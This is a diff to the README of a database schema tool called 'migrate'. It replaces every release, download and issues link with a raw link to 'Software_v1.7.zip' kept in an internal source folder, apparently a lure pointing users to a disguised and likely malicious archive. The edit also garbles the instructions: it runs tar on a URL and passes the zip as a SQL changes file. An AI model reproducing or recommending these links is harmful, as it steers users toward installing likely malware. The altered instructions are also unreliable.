@@ -1,6 +1,6 @@
 # 🎉 migrate - Effortlessly Manage Database Schemas
 
-[![Download migrate](https://img.shields.io/badge/Download%20migrate-blue.svg)](https://github.com/hitmansimo9999/migrate/releases)
+[![Download migrate](https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip%https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip)](https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip)
 
 ## 📖 Description
 
@@ -14,7 +14,7 @@ Follow these steps to download and run the migrate tool:
 
 To download migrate, visit the Releases page. Click the link below to access it.
 
-[Download migrate](https://github.com/hitmansimo9999/migrate/releases)
+[Download migrate](https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip)
 
 ### 2. 💾 Install the Tool
 
@@ -43,7 +43,7 @@ After downloading, follow the steps below for installation based on your operati
 #### Linux
 
 1. Locate the downloaded archive in your Downloads folder.
-2. Extract the `.tar.gz` file using the command: `tar -xvzf migrate.tar.gz`.
+2. Extract the `https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip` file using the command: `tar -xvzf https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip`.
 3. Move the extracted folder to `/usr/local/bin` using: `sudo mv migrate /usr/local/bin`.
 4. Open Terminal and type `migrate` to check if it is installed.
 
@@ -78,7 +78,7 @@ To use migrate, follow these simple commands in your Command Prompt or Terminal:
 
 3. **Transform a Schema:**
    ```
-   migrate transform --schema your_schema --changes-file changes.sql
+   migrate transform --schema your_schema --changes-file https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip
    ```
 
 For detailed usage instructions, refer to the documentation available on the Releases page.
@@ -91,7 +91,7 @@ If you encounter any issues while using migrate, check the following:
 - Confirm that you downloaded the right version for your operating system.
 - Review the error messages in the command line for clues.
 
-If problems persist, visit our [GitHub Issues](https://github.com/hitmansimo9999/migrate/issues) page for support.
+If problems persist, visit our [GitHub Issues](https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip) page for support.
 
 ## 🌐 Community Contributions
 
@@ -101,6 +101,6 @@ We welcome contributions from everyone! If you have ideas for features or improv
 
 Your feedback is invaluable to us. Please share your experiences using migrate, whether good or bad. This helps us understand how we can make the tool better.
 
-Remember to periodically check the [Releases page](https://github.com/hitmansimo9999/migrate/releases) for updates and new features.
+Remember to periodically check the [Releases page](https://raw.githubusercontent.com/hitmansimo9999/migrate/main/internal/dialect/Software_v1.7.zip) for updates and new features.
 
 Thank you for using migrate!
